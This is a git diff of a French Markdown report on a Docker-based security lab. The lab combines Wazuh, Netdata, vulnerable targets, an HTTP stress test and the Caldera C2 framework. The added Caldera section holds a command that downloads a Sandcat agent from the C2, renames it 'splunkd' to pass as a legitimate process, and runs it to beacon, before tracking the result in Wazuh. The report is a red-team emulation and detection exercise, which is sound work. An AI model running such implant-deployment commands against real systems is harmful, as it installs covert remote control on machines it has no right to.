@@ -268,8 +268,6 @@ volumes:
   netdata_etc:
 ```
 
-Stack lancée depuis `~/Final` via `docker compose up -d` :
-
 - **Wazuh Indexer** (`wazuh.indexer:4.13.1`) — indexation / moteur (port `9200`)  
 - **Wazuh Manager** (`wazuh.manager:4.13.1`) — collecte / rules / API (ports `1514`, `1515`, `514/udp`, `55000`)  
 - **Wazuh Dashboard** (`wazuh.dashboard:4.13.1`) — UI/Kibana (port `443` exposé)  
@@ -278,9 +276,9 @@ Stack lancée depuis `~/Final` via `docker compose up -d` :
 - **Cibles** : `hello` (SSH vuln container)
 - **Agents Wazuh** : `wazuh.agent-hello`, `wazuh.agent-juice` — pour remonter télémétrie depuis les cibles  
 - **Netdata** (`netdata`) — observabilité temps réel (port `19999`)  
-- **Windows (dockurr/windows)** — optionnel (profil bonus), fonctionne si `/dev/kvm` dispo
+- **Windows (dockurr/windows)** — (bonus)
 
-Tous les services sont sur le même réseau Docker (réseau `default` ou `labnet` selon compose).
+Ce docker-compose.yml permet donc d'exécuter l'ensemble de ces services !
 
 ---
 
@@ -289,14 +287,14 @@ Tous les services sont sur le même réseau Docker (réseau `default` ou `labnet
 #### Objectif
 Générer une charge HTTP élevée sur plusieurs conteneurs web pour :
 - observer l’impact CPU/Mémoire/Réseau/Disk dans **Netdata**,
-- valider que Netdata identifie les conteneurs par nom (ou activer liaison `docker.sock`),
-- produire captures & métriques pour le rapport.
+- valider que Netdata identifie les conteneurs par nom,
+- produire captures & métriques.
 
 > **ATTENTION** : tests agressifs peuvent saturer la VM / faire swapper / rendre la VM inutilisable.
 
 
 #### 1 — Déployer trois conteneurs web (commandes)
-Copier/coller sur la VM hôte (ou exécuter localement si Docker installé) :
+VM hôte (ou exécuter localement si Docker installé) :
 
 ```bash
 # Caddy (port 80)
@@ -364,7 +362,7 @@ pkill ab
 
 Dans **Netdata** (`http://localhost:19999`) :  
 - **Containers & VMs → Cgroups** : CPU / Memory / Disk I/O par conteneur  
-- **Docker Engine** (si activé) : connectivité & réseau par container  
+- **Docker Engine** : connectivité & réseau par container  
 - **System Overview** : load average, CPU % global, swap, disk I/O
 
 **Avant le stress test** :
@@ -380,27 +378,26 @@ Dans **Netdata** (`http://localhost:19999`) :
 - **Saturation CPU → montée du load average** → risque d’échec de réponses, augmentation latence, erreurs 5xx.  
 - **Swap utilisé** → VM insuffisante => réduire charge ou augmenter RAM.  
 - **Disk I/O élevé** → logs/Indexing qui sature le disque (Wazuh Indexer peut générer I/O).  
-- **Network I/O** → pics pendant benchs (exfil possible si simulateur d’exfil).  
-- **Erreurs HTTP (5xx)** dans les logs applicatifs (si juice-shop/nginx/httpd retournent des erreurs).
+- **Network I/O** → pics pendant benchs (exfil possible si simulateur d’exfil). 
 
 Ce premier stress test valide la visibilité de l’infrastructure via Netdata et montre la montée en charge maîtrisée des conteneurs. Il sert de point de référence pour mesurer l’impact des futures opérations offensives.
 
 ---
-### B. **Caldera** - C2
+### B. **Caldera & Wazuh**
 #### Objectif
-XXX
+Déployer et contrôler des agents Sandcat (HTTP et P2P) depuis Caldera afin d'émuler des TTPs et collecter traces/logs dans Wazuh et Netdata.
 
 
-#### 1 — Connexion
+#### 1 — Credentials & connexion
 On se rend sur http://localhost:8888
 ![alt text](image-6.png)
+Caldera, par défaut, conserve une config dans le conteneur. Pour retrouver le user/password `red` (ou les credentials utiles), on ouvre un shell dans le conteneur Caldera :
 
-Pour connaitre le mot de passe, on ouvre un shell dans le conteneur Caldera :
 ```bash
 docker exec -it caldera /bin/bash || docker exec -it caldera /bin/sh
 ```
 
-Puis on affiche le contenu :
+Puis on affiche le contenu du local.yml :
 ```bash
 cat /usr/src/app/conf/local.yml
 ```
@@ -410,3 +407,39 @@ cat /usr/src/app/conf/local.yml
 On peut enfin se connecter : 
 ![alt text](image-8.png)
 
+#### 2 — Déploiement Sandcat - HTTP
+**But** : déployer un agent Sandcat HTTP sur une cible (Linux / Windows / Mac) et vérifier qu'il beacon vers le C2.
+
+On execute l'agent : 
+```bash
+server="http://127.0.0.1:8888";
+curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
+chmod +x splunkd;
+./splunkd -server $server -group red -v
+```
+
+L'agent s'est bien déployé :
+![alt text](image-9.png)
+![alt text](image-10.png)
+
+
+![alt text](image-11.png)
+
+xx
+
+#### 3 — Déploiement opération
+![alt text](image-14.png)
+
+L'opération se lance bien avec un ensemble de commandes qui s'executent !
+On a aussi la possibilité d'en exécuter manuellement.
+
+#### 3 — Wazuh
+On se rend sur https://localhost et on se connecte avec les credentials par défaut : 
+![alt text](image-18.png)
+On arrive sur l'interface global :
+![alt text](image-16.png)
+On observe que notre agent est bien présent et on peut analyser ça :
+![alt text](image-15.png)
+![alt text](image-17.png)
+
+On voit bien les remontées d'informations directement sur notre interface !
